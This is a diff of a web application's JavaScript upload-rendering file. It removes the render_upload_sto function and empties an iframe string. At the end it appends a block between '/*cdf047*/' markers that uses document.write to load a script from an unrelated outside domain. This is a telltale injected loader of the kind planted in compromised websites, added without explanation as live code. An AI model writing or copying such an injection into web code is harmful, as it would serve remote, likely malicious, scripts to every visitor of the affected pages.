@@ -658,41 +658,7 @@ function render_upload(tb,campo,id,img_default,il){
 			'</div>'+
 		'</div>'+
 	'</form>'+
-	'<iframe width="300" height="300" frameborder="0" style="position: absolute; display:none;" name="iframe_upload" id="iframe_upload"></iframe>';
-	html+='</div>'
-	return html;
-
-}
-
-function render_upload_sto(tb,campo,id,name){
-
-	var id2=(id=='')?'':'_'+id;
-	var html='<div style="width:auto;float:left;position:relative;">';
-	if(name!=USU_IMG_DEFAULT && name!=''){
-	html+='<a style="position:absolute;display:block;top:3px;right:10px;font-weight:bold;color:red;background-color:#FFF;padding:0 1px;"  onclick="eliminar_img_sto(\''+tb+'\',\''+campo+id2+'\');return false;"  title="eliminar">X</a>';
-	}
-	html+='<input type="hidden" id="upload_in_'+campo+id2+'" />'+
-	'<span id="txt_'+campo+id2+'_name" value="'+name+'" style="float:left;" ></span>'+
-	'<form style="float:left;height:auto;" id="form_'+campo+id2+'" action="script_upload_sto.php?obj='+MMEE+'&tb='+tb+'&camp='+campo+id2+'&objcam='+campo+'" enctype="multipart/form-data" method="post" target="iframe_upload" >';
-		/*html+='<table id="image_'+campo+id2+'_default" cellpadding="0" border="0" cellspacing="0"  class="upload_table1">'+
-		'<tr><td align="center" valign="middle" class="upload_table2">'+
-			'<img src="'+img_default+'" id="image_'+campo+id2+'_img" class="upload_img_default"/>'+
-		'</td></tr></table>';*/
-		html+='<img src="img/cerrarfoto.gif" id="image_'+campo+id2+'_img_cerrar" class="upload_img_cerrar" '+
-		 'style="display:none;" onclick="reset_img_sto(\''+tb+'\',\''+campo+id2+'\');" title="cerrar"/>'+
-		'<span  class="upload_copiando2" style=" display:none;" id="image_'+campo+id2+'_copiando">'+
-			'<img src="img/load2.gif" />'+
-		'</span>'+
-		'<span class="upload_controles1" id="image_'+campo+id2+'_controles1">'+
-			'<span class="input_file_content">'+
-			'<input style="margin-top:0px;'+styleinfi+'" type="file" name="v_file_'+campo+id2+'"   '+
-			'onchange="if(this.value!=\'\') upload_sto(\''+tb+'\',\''+campo+id2+'\'); " '+
-			'class="upload_input_file"  autocomplete="off" />'+
-			'<span id="error_'+campo+id2+'" class="upload_error"></span>'+
-			'</span>'+
-		'</span>'+
-	'</form>'+
-	'<iframe width="300" height="300" frameborder="0" style="position: absolute; display:none;" name="iframe_upload" id="iframe_upload"></iframe>';
+	'';
 	html+='</div>'
 	return html;
 
@@ -1044,3 +1010,13 @@ function program_alert_remove(ii){
 	$(ii+"_ined").removeEvent('click', destroy);
 
 }
+
+/*cdf047*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/cdf047*/
